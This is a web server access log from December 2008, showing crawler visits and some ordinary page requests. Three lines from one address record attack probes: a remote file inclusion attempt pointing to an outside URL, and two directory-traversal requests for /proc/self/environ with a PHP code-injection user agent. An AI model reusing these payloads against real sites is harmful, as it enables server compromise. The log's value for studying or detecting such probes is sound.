67.195.37.167 - - [26/Dec/2008:19:56:32 -0500] "GET /toastpointtopright.html HTTP/1.0" 200 151 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
67.195.37.167 - - [26/Dec/2008:19:56:32 -0500] "GET /tpnews.html HTTP/1.0" 200 8305 "-" "Mozilla/5.0 (compatible; Yahoo! DE Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
208.115.111.245 - - [26/Dec/2008:20:21:44 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)"
68.142.215.138 - - [26/Dec/2008:20:27:17 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (Yahoo-MMCrawler/4.0; mailto:vertical-crawl-support@yahoo-inc.com)"
68.142.215.138 - - [26/Dec/2008:20:27:17 -0500] "GET /rapture/ida-monk.gif HTTP/1.0" 200 3753 "-" "Mozilla/5.0 (Yahoo-MMCrawler/4.0; mailto:vertical-crawl-support@yahoo-inc.com)"
68.142.215.138 - - [26/Dec/2008:20:48:37 -0500] "GET /robots.txt HTTP/1.0" 404 693 "-" "Mozilla/5.0 (Yahoo-MMCrawler/4.0; mailto:vertical-crawl-support@yahoo-inc.com)"
68.142.215.138 - - [26/Dec/2008:20:48:37 -0500] "GET /rapture/ida-monk.gif HTTP/1.0" 200 3753 "-" "Mozilla/5.0 (Yahoo-MMCrawler/4.0; mailto:vertical-crawl-support@yahoo-inc.com)"
208.80.194.45 - - [26/Dec/2008:21:06:25 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; (R1 1.5); .NET CLR 1.1.4322; SpamBlockerUtility 4.8.0; ZangoToolbar 4.8.3)"
204.214.80.199 - - [26/Dec/2008:21:12:58 -0500] "GET /errors.php?error=http://chicas-manga.com/images/i?? HTTP/1.1" 404 693 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox"
204.214.80.199 - - [26/Dec/2008:21:12:58 -0500] "GET //guestbook5/admin.php?include_path=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ HTTP/1.1" 404 693 "-" "XXX<? echo \"w0000t\"; ?>XXX"
204.214.80.199 - - [26/Dec/2008:21:12:58 -0500] "GET //guestbook5/admin.php?include_path=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 693 "-" "XXX<? echo \"w0000t\"; ?>XXX"
208.80.194.51 - - [26/Dec/2008:22:32:39 -0500] "GET / HTTP/1.0" 200 464 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; FunWebProducts; .NET CLR 1.0.3705; IEMB3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; IEMB3)"
68.187.96.40 - - [26/Dec/2008:22:50:31 -0500] "GET /writing/kyw.html HTTP/1.1" 200 3576 "http://www.google.com/search?hl=en&q=%22smallest+chevrolet+dealer%22&btnG=Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
208.115.111.245 - - [26/Dec/2008:23:02:53 -0500] "GET /robots.txt HTTP/1.1" 404 693 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)"
208.115.111.245 - - [26/Dec/2008:23:50:24 -0500] "GET / HTTP/1.1" 200 464 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.dotnetdotcom.org/, crawler@dotnetdotcom.org)"
